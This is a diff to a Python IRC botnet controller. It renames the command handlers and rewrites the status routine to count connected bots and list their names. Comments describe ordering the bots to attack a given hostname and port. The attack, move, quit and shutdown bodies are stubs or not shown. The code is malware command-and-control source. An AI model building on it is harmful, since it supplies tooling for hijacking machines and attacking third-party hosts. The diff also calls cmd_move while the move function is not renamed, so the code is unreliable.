@@ -23,18 +23,29 @@ def send_command():
 
 
 #ids bots and prints out numbers
-def status():
+def cmd_status():
 	send("PRIVMSG " + channel +" "+"status"+"\n")
 	##gets replieds back from irc
-	msg = rcv_irc_response()
-	print(msg.strip())
-
-	cmd = msg[msg.find(':', 1)+1:]
+	msg = ""
+	while msg == "":
+		time.sleep(1)
+		msg = rcv_irc_response()
+		msg = msg.strip()
+	
+	i = 0
+	bot_names = []
+	msgs = msg.split("\n")
+	for m in msgs:
+		i = i +1
+		bot_names.append((m[m.find(':', 1)+1:] + "\n").strip())
+		
+	print("num of bots: " + str(i))
+	print(str(bot_names))
 	#except somerror:
 		#con_active = False
 	
 #tells the bots to attack the hostname
-def attack(hostname, port):
+def cmd_attack(hostname, port):
 	#send a message containing  a counter and the nick of the bot
 	#on next attack increase the counter
 	#bots send a message back to controller telling if success or not  
@@ -48,11 +59,11 @@ def move(hostname, port, channel):
 	return
 
 #controller will disconnect from the bots and terminate
-def quit():	
+def cmd_quit():	
 	return
 
 #this kills the bot(s)
-def shutdown():
+def cmd_shutdown():
 	return
 
 #wait for a user to send command to the irc needs error checking
@@ -115,15 +126,15 @@ def handle_connection():
 						
 				#interpret command
 				if cmd[0] == 'status':	
-					status()
+					cmd_status()
 				elif cmd[0] == "attack":
-					attack(cmd[1],cmd[2])
+					cmd_attack(cmd[1],cmd[2])
 				elif cmd[0] == "move":
-					move(cmd[1], cmd[2], cmd[3]) 
+					cmd_move(cmd[1], cmd[2], cmd[3]) 
 				elif cmd[0] == "quit":
-					quit() 
+					cmd_quit() 
 				elif cmd[0] == "shutdown":
-					shutdown()
+					cmd_shutdown()
 				elif con_active == False:
 					break
 				else:
